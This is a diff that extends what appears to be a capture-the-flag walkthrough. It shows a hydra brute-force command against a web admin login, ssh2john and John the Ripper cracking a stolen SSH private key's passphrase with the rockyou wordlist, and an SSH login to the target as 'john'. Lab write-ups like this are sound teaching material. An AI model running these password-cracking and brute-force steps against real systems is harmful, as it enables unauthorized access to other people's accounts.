@@ -55,3 +55,21 @@ This capruted post request will provide us with everything we need to craft a di
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
 ```
+And this cracks the login password! After logging in we are see the flag as well as a message to john and a link to his rsa key. We need to save this key.
+![msg to john](https://github.com/user-attachments/assets/bf154e4f-0d71-45b3-b085-6f78a1558a37)
+
+Now, we need to change it's permissions and attempt to log in with it:
+![ssh rsa](https://github.com/user-attachments/assets/47efd633-5b22-4075-9b0d-8ccfede64645)
+But it prompts for a password. So we need to use ssh2john to create a hash that john can crack:
+```bash
+ssh2john id_rsa > hash
+```
+Then crack this hash with john:
+```bash
+/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+Now that we have the password let's use it to ssh onto the target:
+```bash
+ssh -i id_rsa john@$ip
+```
+
